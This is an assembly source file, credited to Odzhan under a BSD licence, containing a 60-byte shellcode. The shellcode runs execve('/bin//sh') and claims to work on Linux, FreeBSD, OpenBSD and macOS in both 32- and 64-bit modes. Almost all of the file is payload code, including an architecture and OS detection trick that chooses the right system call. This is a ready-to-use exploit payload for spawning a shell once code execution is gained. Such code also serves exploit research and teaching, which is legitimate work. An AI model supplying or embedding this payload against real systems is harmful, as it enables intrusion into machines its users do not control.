;
;  Copyright © 2017 Odzhan. All Rights Reserved.
;
;  Redistribution and use in source and binary forms, with or without
;  modification, are permitted provided that the following conditions are
;  met:
;
;  1. Redistributions of source code must retain the above copyright
;  notice, this list of conditions and the following disclaimer.
;
;  2. Redistributions in binary form must reproduce the above copyright
;  notice, this list of conditions and the following disclaimer in the
;  documentation and/or other materials provided with the distribution.
;
;  3. The name of the author may not be used to endorse or promote products
;  derived from this software without specific prior written permission.
;
;  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
;  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
;  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
;  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
;  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
;  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
;  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
;  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
;  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
;  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
;  POSSIBILITY OF SUCH DAMAGE.
;
; 60 bytes execve("/bin//sh", {"/bin//sh", NULL}, 0);
;
; Tested on 32 and 64-bit versions of Linux, FreeBSD, OpenBSD, Mac OSX
;
    bits   32
    
    xor     eax, eax    ; eax = 0
    cdq                 ; edx = 0
    push    edx         ; '\0'
    push    edx         ; null space
    push    edx         ; null space
    push    esp
    pop     ebx         ; ebx = "/bin//sh", 0
    push    ebx         ; save pointer to "/bin//sh", 0
    pop     edi         ; rdi="/bin//sh", 0
    mov     dword[edi+0], '/bin'
    mov     dword[edi+4], '//sh'
    ; ---------
    push    edx         ; argv[1]=NULL
    push    edi         ; argv[0]="/bin//sh", 0
    push    esp
    pop     esi         ; rsi=argv
    push    esi
    pop     ecx         ; ecx=argv
    ; ---------
    inc     eax
    jnz     x32
    mov     al, 59      ; rax=sys_execve
    syscall
x32:
    push    edx
    push    ecx
    push    ebx
    push    esp
    push    11          ; sys_execve on 32-bit linux
    ; ---------
    mov     al, 6       ; eax=sys_close
    push    -1          ; invalid descriptor
    push    esp
    int     0x80
    test    eax, eax
    pop     eax         ; eax = esp
    pop     eax         ; eax = -1
    pop     eax         ; eax = 11
    jl      xsc         ; we're linux
    mov     al, 59      ; sys_execve on 32-bit bsd
xsc:    
    int     0x80
    
    

    
